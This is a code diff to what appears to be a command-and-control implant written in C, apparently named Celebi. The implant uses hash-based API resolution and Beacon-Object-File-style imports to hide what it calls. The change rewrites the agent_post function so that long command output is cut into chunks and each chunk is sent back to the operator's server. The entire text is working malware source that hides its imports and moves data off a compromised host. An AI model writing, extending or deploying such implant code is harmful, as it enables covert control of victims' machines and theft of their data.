@@ -16,6 +16,9 @@ WINBASEAPI size_t MSVCRT$strlen(const char *str);
 WINBASEAPI int MSVCRT$strcmp(const char *string1, const char *string2);
 WINBASEAPI char *MSVCRT$strtok(char *strToken, const char *strDelimit);
 
+WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
+WINBASEAPI BOOL WINAPI KERNEL32$VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD  dwFreeType);
+
 FARPROC resolve(DWORD modHash, DWORD funcHash) {
 	HANDLE hModule = findModuleByHash(modHash);
 	return findFunctionByHash(hModule, funcHash);
@@ -31,13 +34,39 @@ FARPROC resolve_unloaded(char * mod, char * func) {
 
 void agent_post(AgentState *state, TaskInfo *task, char *output, char *success) {
 	TaskPostReply reply = { 0 };
-	BOOL result = perform_post(state, task, &reply, output, success);
+	BOOL result;
 	
-	#ifdef CELEBI_DEBUG
-	if (result == TRUE && reply.success == 1) {
-		dprintf("Server acknowledged posted command output.");
+	size_t out_len = MSVCRT$strlen(output);
+	
+	// If the message is short, just send it.
+	if (out_len <= MAXIMUM_POST_SIZE) {
+		result = perform_post(state, task, &reply, output, success);
+		
+		#ifdef CELEBI_DEBUG
+		if (result == TRUE && reply.success == 1) {
+			dprintf("Server acknowledged posted command output.");
+		}
+		#endif
+		
+		return;
 	}
-	#endif
+	
+	// Otherwise, break it up into chunks.
+	for (int i = 0; i < out_len; i += MAXIMUM_POST_SIZE) {
+		int next_len = i + MAXIMUM_POST_SIZE < out_len ? MAXIMUM_POST_SIZE : (out_len - i);
+		char *next = KERNEL32$VirtualAlloc(0, next_len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+		for (int j = 0; j < next_len; j++) {
+			next[j] = output[i+j];
+		}
+		result = perform_post(state, task, &reply, next, success);
+		KERNEL32$VirtualFree(next, 0, MEM_RELEASE);
+		
+		#ifdef CELEBI_DEBUG
+		if (result == TRUE && reply.success == 1) {
+			dprintf("Server acknowledged posted command output.");
+		}
+		#endif
+	}
 }
 
 void agent_exit(AgentState *state, TaskInfo *task) {
